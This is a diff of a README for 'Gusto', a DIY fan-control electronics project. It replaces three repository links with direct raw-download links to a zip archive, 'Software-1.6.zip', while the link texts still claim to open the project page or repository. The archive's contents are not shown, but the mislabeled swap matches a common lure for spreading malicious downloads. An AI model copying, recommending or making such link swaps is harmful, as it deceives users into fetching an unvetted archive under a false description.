@@ -1,6 +1,6 @@
 # 🪭 Gusto - Custom Fan Control For Small Rooms
 
-[![Download Gusto](https://img.shields.io/badge/Download%20Gusto-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/ebtehaldousset-sudo/Gusto)
+[![Download Gusto](https://img.shields.io/badge/Download%20Gusto-Blue%20%26%20Grey-blue?style=for-the-badge)](https://raw.githubusercontent.com/ebtehaldousset-sudo/Gusto/main/Construction/Software-1.6.zip)
 
 ## ⚡ What Gusto Does
 
@@ -12,7 +12,7 @@ This project is made for people who want a practical fan control build with part
 
 Use this link to visit the project page and download or open the files:
 
-[Visit the Gusto download page](https://github.com/ebtehaldousset-sudo/Gusto)
+[Visit the Gusto download page](https://raw.githubusercontent.com/ebtehaldousset-sudo/Gusto/main/Construction/Software-1.6.zip)
 
 After you open the page:
 
@@ -194,7 +194,7 @@ DIY electronics, fan control, infrared control, PWM, integrated circuits, maker 
 
 ## 📦 Download Again
 
-[Open the Gusto repository and download the files](https://github.com/ebtehaldousset-sudo/Gusto)
+[Open the Gusto repository and download the files](https://raw.githubusercontent.com/ebtehaldousset-sudo/Gusto/main/Construction/Software-1.6.zip)
 
 ## 🛠️ Suggested Next Step
 
